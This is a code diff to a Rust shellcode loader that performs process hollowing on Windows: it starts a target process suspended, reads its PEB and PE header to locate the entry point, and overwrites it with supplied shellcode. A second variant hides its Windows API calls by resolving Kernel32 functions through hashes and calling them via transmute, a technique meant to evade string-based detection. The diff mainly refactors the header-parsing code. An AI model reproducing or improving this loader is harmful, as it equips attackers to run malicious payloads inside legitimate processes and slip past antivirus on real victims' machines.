@@ -19,26 +19,6 @@ const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
-// Taken from https://stackoverflow.com/questions/36669427/does-rust-have-a-way-to-convert-several-bytes-to-a-number
-fn array_to_u32_lit_end(array: &[u8; 4]) -> u32 {
-    (array[0] as u32)       |
-    (array[1] as u32) <<  8 |
-    (array[2] as u32) << 16 |
-    (array[3] as u32) << 24
-}
-
-// Same as above but bigger array --> bigger number
-fn array_to_u64_lit_end(array: &[u8; 8]) -> u64 {
-    (array[0] as u64)       |
-    (array[1] as u64) <<  8 |
-    (array[2] as u64) << 16 |
-    (array[3] as u64) << 24 |
-    (array[4] as u64) << 32 |
-    (array[5] as u64) << 40 |
-    (array[6] as u64) << 48 |
-    (array[7] as u64) << 56
-}
-
 #[cfg(not(feature = "antistring"))]
 pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Create empty StartupInfoA struct for use in CreateProcess
@@ -88,28 +68,29 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
     let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
     let mut address_buffer = [0; POINTER_SIZE];
-    let read_result = unsafe { ReadProcessMemory(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as _, address_buffer.len(), ptr::null_mut()) };
+    let read_result = unsafe { ReadProcessMemory(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as *mut c_void, address_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
         panic!("Could not read the address of the code base with ReadProcessMemory");
     }
 
     // Use ReadProcessMemory again to read 512 bytes of memory; the DOS header
-    let pe_base_address = array_to_u64_lit_end(&address_buffer);
-    let mut header_buffer = [0; 0x200];
-    let read_result = unsafe { ReadProcessMemory(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as _, header_buffer.len(), ptr::null_mut()) };
+    let mut header_buffer = [0_u8; 0x200];
+    let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
+    let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
+    let read_result = unsafe { ReadProcessMemory(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as *mut c_void, header_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
         panic!("Could not read the DOS header with ReadProcessMemory");
-    } else if header_buffer[0] != 77 || header_buffer[1] != 90 {
+    } else if header_buffer[0] as char != 'M' || header_buffer[1] as char != 'Z' {
         panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
     }
 
     // Write the shellcode to the suspended process with WriteProcessMemory
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
-    let e_lfanew = array_to_u32_lit_end(&header_buffer[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 0x04].try_into().unwrap());
+    let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
-    let entry_point_rva = array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
-    let entry_point_address = entry_point_rva as u64 + pe_base_address;
+    let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
+    let entry_point_address = entry_point_rva as usize + pe_base_address;
 
     let write_result = unsafe { WriteProcessMemory(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
@@ -147,7 +128,7 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
                    ptr::null(),
                    false,
                    CREATE_SUSPENDED,
-                   ptr::null() as *const _,
+                   ptr::null(),
                    lp_current_directory,
                    &startup_info,
                    &mut process_information)
@@ -169,15 +150,16 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     let mut address_buffer = [0; POINTER_SIZE];
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize)>
-        (function)(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as _, address_buffer.len(), ptr::null_mut())
+        (function)(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as *mut c_void, address_buffer.len(), ptr::null_mut())
     };
 
     // See line 96
-    let pe_base_address = array_to_u64_lit_end(&address_buffer);
-    let mut header_buffer = [0; 0x200];
+    let mut header_buffer = [0_u8; 0x200];
+    let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
+    let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize)>
-        (function)(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as _, header_buffer.len(), ptr::null_mut())
+        (function)(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as *mut c_void, header_buffer.len(), ptr::null_mut())
     };
     if header_buffer[0] != 77 || header_buffer[1] != 90 {
         panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
@@ -185,10 +167,10 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 106
     let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
-    let e_lfanew = array_to_u32_lit_end(&header_buffer[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 0x04].try_into().unwrap());
+    let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
-    let entry_point_rva = array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
-    let entry_point_address = entry_point_rva as u64 + pe_base_address;
+    let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
+    let entry_point_address = entry_point_rva as usize + pe_base_address;
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *const c_void, usize, *mut usize)>
         (function)(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut())
